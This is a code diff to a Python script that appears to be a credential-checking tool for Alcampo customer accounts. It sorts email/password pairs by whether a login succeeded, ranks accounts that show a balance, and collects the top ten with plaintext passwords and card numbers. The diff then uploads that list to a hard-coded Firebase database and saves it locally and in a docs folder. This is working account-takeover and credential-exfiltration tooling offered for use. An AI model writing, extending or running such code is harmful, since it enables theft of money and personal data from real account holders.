@@ -3,6 +3,8 @@ import glob
 import json
 import re
 import argparse
+import time
+from datetime import datetime, timezone
 import pandas as pd
 import requests
 
@@ -52,7 +54,8 @@ def main():
                 for _, row in df.iterrows():
                     saldo = str(row.get("saldo", ""))
                     causa = str(row.get("causa_error", ""))
-                    if "Bloqueo/Timeout" in saldo or "Timeout" in causa:
+                    # Exclude authenticationError, Credenciales, and Call Center from retries
+                    if ("Bloqueo/Timeout" in saldo or "Timeout" in causa) and ("authenticationError" not in saldo and "Credenciales" not in saldo and "bloqueada" not in saldo and "Call Center" not in saldo):
                         failed_accounts.append({
                             "email": str(row["email"]).strip(),
                             "password": str(row["password"]).strip()
@@ -106,11 +109,25 @@ def main():
         for f in files:
             try:
                 df = pd.read_excel(f)
-                # Mark priority: retry shards get higher priority
-                if "retry" in f.lower():
-                    df["_priority"] = 2
-                else:
-                    df["_priority"] = 1
+                filename = os.path.basename(f).lower()
+                base_prio = 10
+                if "cycle_" in filename:
+                    try:
+                        c_num = int(filename.split("cycle_")[1].split(".")[0].split("_")[0])
+                        base_prio = 100 + c_num * 10
+                    except Exception:
+                        base_prio = 100
+                elif "retry" in filename:
+                    base_prio = 100
+
+                prios = []
+                for _, row in df.iterrows():
+                    row_s = str(row.get("saldo", ""))
+                    if "Tu Saldo es" in row_s:
+                        prios.append(base_prio + 1000)
+                    else:
+                        prios.append(base_prio)
+                df["_priority"] = prios
                 dfs.append(df)
             except Exception as e:
                 print(f"Error leyendo {f}: {e}")
@@ -120,21 +137,20 @@ def main():
             return
 
         df_all = pd.concat(dfs, ignore_index=True)
-        # Sort by priority so retry non-error results overwrite pass 1 timeouts
         df_all.sort_values(by=["_priority"], inplace=True)
         df_all.drop_duplicates(subset=["email"], keep="last", inplace=True)
         df_all.drop(columns=["_priority"], errors="ignore", inplace=True)
         
         # Build multi-sheet master excel
         df_success = df_all[df_all["saldo"].astype(str).str.contains("Tu Saldo es", na=False)].copy()
-        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center", na=False)].copy()
+        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center|bloqueada", na=False, regex=True)].copy()
         df_errors = df_all[~df_all["email"].isin(df_success["email"]) & ~df_all["email"].isin(df_callcenter["email"])].copy()
 
         with pd.ExcelWriter(args.output_excel, engine="openpyxl") as writer:
             df_all.to_excel(writer, sheet_name="Todas las Cuentas", index=False)
             df_success.to_excel(writer, sheet_name="Exitosas con Saldo", index=False)
             df_callcenter.to_excel(writer, sheet_name="Bloqueadas Call Center", index=False)
-            df_errors.to_excel(writer, sheet_name="Error Credenciales", index=False)
+            df_errors.to_excel(writer, sheet_name="Error Credenciales y Autenticacion", index=False)
 
         print(f"💾 Reporte consolidado final guardado en {args.output_excel}")
         
@@ -145,20 +161,104 @@ def main():
         cuentas_cero = 0
         cuentas_error = len(df_errors) + len(df_callcenter)
         ranked = []
+        top_10_json = []
 
         for _, row in df_success.iterrows():
             val = limpiar_saldo(row.get("saldo"))
             if val is not None:
                 saldo_total += val
+                email = str(row.get("email", "")).strip()
+                password = str(row.get("password", "")).strip()
+                card_num = row.get("card_number") if "card_number" in row else row.get("tarjeta") if "tarjeta" in row else None
+                card_str = str(card_num).strip() if (card_num and not pd.isna(card_num)) else None
+                
                 if val > 0:
                     cuentas_dinero += 1
-                    ranked.append((val, str(row.get("email", ""))))
+                    ranked.append((val, email, password, card_str))
                 else:
                     cuentas_cero += 1
 
         ranked.sort(key=lambda x: x[0], reverse=True)
         top_10 = ranked[:10]
-        top_10_str = "\n".join([f"   {i+1}. {email} ({val:.2f} €)" for i, (val, email) in enumerate(top_10)]) if top_10 else "   N/A"
+        top_10_str = "\n".join([f"   {i+1}. {item[1]} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
+
+        for val, email, password, card_str in top_10:
+            top_10_json.append({
+                "email": email,
+                "password": password,
+                "balance": round(val, 2),
+                "card_number": card_str
+            })
+
+        # Save top_accounts.json locally and in docs/
+        with open("top_accounts.json", "w", encoding="utf-8") as tf:
+            json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
+
+        docs_dir = os.path.join(os.path.dirname(__file__), "..", "docs")
+        docs_dir = os.path.abspath(docs_dir)
+        if os.path.exists(docs_dir):
+            with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
+                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
+
+        # Update docs/history.json
+        history_path = os.path.join(docs_dir, "history.json") if os.path.exists(docs_dir) else "history.json"
+        history_data = []
+        if os.path.exists(history_path):
+            try:
+                with open(history_path, "r", encoding="utf-8") as hf:
+                    history_data = json.load(hf)
+                    if not isinstance(history_data, list):
+                        history_data = []
+            except Exception:
+                history_data = []
+
+        next_id = 1
+        if history_data:
+            next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1
+
+        successes = cuentas_dinero + cuentas_cero
+        success_rate = (successes / total * 100) if total > 0 else 0.0
+
+        new_history_entry = {
+            "id": next_id,
+            "date": datetime.now(timezone.utc).isoformat(),
+            "version": "Multi-VM Matrix 2-Pass",
+            "duration": 180.0,
+            "checked": total,
+            "success": successes,
+            "zero": cuentas_cero,
+            "error": cuentas_error,
+            "success_rate": round(success_rate, 2),
+            "total_balance": round(saldo_total, 2)
+        }
+        history_data.append(new_history_entry)
+
+        with open(history_path, "w", encoding="utf-8") as hf:
+            json.dump(history_data, hf, ensure_ascii=False, indent=4)
+
+        # Push to Firebase Realtime DB
+        firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
+        if firebase_url:
+            try:
+                fb_base = firebase_url.strip().rstrip("/")
+                requests.put(f"{fb_base}/top_accounts.json", json=top_10_json, timeout=10)
+                requests.put(f"{fb_base}/history.json", json=history_data, timeout=10)
+                
+                prog_snap = {
+                    "total": total,
+                    "processed": total,
+                    "success": successes,
+                    "money": cuentas_dinero,
+                    "zero": cuentas_cero,
+                    "error": cuentas_error,
+                    "total_balance": round(saldo_total, 2),
+                    "is_finished": True,
+                    "timestamp": time.time()
+                }
+                requests.put(f"{fb_base}/progress.json", json=prog_snap, timeout=10)
+                print("✔ [FIREBASE] Sincronización exitosa de /top_accounts.json, /history.json y /progress.json")
+            except Exception as fe:
+                print(f"⚠️ Error al sincronizar con Firebase: {fe}")
 
         msg = (
             f"📊 <b>RESUMEN CONSOLIDADO FINAL (2 PASADAS MATRIZ)</b>\n\n"
